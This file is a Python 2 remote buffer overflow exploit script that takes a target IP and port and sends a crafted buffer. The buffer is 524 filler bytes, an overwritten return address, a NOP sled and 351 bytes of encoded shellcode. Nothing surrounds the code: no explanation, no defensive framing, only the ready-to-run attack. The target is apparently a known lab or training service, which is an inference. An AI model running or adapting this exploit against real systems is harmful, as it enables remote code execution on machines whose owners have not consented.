#!/usr/bin/python
import socket
import sys

if (len(sys.argv) != 3):
    print "Usage: python " + sys.argv[0] + " <IP> <PORT>"
    sys.exit()
host = sys.argv[1]
port = sys.argv[2]

shellcode = ("\xd9\xc5\xbb\x80\xbc\xe7\x8a\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x5d\x17\x03\x5d\x17\x83\x45\xb8\x05\x7f\xb9\x29\x4b"
"\x80\x41\xaa\x2c\x08\xa4\x9b\x6c\x6e\xad\x8c\x5c\xe4\xe3\x20"
"\x16\xa8\x17\xb2\x5a\x65\x18\x73\xd0\x53\x17\x84\x49\xa7\x36"
"\x06\x90\xf4\x98\x37\x5b\x09\xd9\x70\x86\xe0\x8b\x29\xcc\x57"
"\x3b\x5d\x98\x6b\xb0\x2d\x0c\xec\x25\xe5\x2f\xdd\xf8\x7d\x76"
"\xfd\xfb\x52\x02\xb4\xe3\xb7\x2f\x0e\x98\x0c\xdb\x91\x48\x5d"
"\x24\x3d\xb5\x51\xd7\x3f\xf2\x56\x08\x4a\x0a\xa5\xb5\x4d\xc9"
"\xd7\x61\xdb\xc9\x70\xe1\x7b\x35\x80\x26\x1d\xbe\x8e\x83\x69"
"\x98\x92\x12\xbd\x93\xaf\x9f\x40\x73\x26\xdb\x66\x57\x62\xbf"
"\x07\xce\xce\x6e\x37\x10\xb1\xcf\x9d\x5b\x5c\x1b\xac\x06\x09"
"\xe8\x9d\xb8\xc9\x66\x95\xcb\xfb\x29\x0d\x43\xb0\xa2\x8b\x94"
"\xb7\x98\x6c\x0a\x46\x23\x8d\x03\x8d\x77\xdd\x3b\x24\xf8\xb6"
"\xbb\xc9\x2d\x18\xeb\x65\x9e\xd9\x5b\xc6\x4e\xb2\xb1\xc9\xb1"
"\xa2\xba\x03\xda\x49\x41\xc4\x25\x25\x48\x19\xce\x34\x4a\x24"
"\x37\xb0\xac\x4c\x57\x94\x67\xf9\xce\xbd\xf3\x98\x0f\x68\x7e"
"\x9a\x84\x9f\x7f\x55\x6d\xd5\x93\x02\x9d\xa0\xc9\x85\xa2\x1e"
"\x65\x49\x30\xc5\x75\x04\x29\x52\x22\x41\x9f\xab\xa6\x7f\x86"
"\x05\xd4\x7d\x5e\x6d\x5c\x5a\xa3\x70\x5d\x2f\x9f\x56\x4d\xe9"
"\x20\xd3\x39\xa5\x76\x8d\x97\x03\x21\x7f\x41\xda\x9e\x29\x05"
"\x9b\xec\xe9\x53\xa4\x38\x9c\xbb\x15\x95\xd9\xc4\x9a\x71\xee"
"\xbd\xc6\xe1\x11\x14\x43\x11\x58\x34\xe2\xba\x05\xad\xb6\xa6"
"\xb5\x18\xf4\xde\x35\xa8\x85\x24\x25\xd9\x80\x61\xe1\x32\xf9"
"\xfa\x84\x34\xae\xfb\x8c")     #size = 351
buff = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 30 + shellcode + '\x90' * 91
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
print s.recv(1024)
s.send(buff + '\r\n')
s.close()
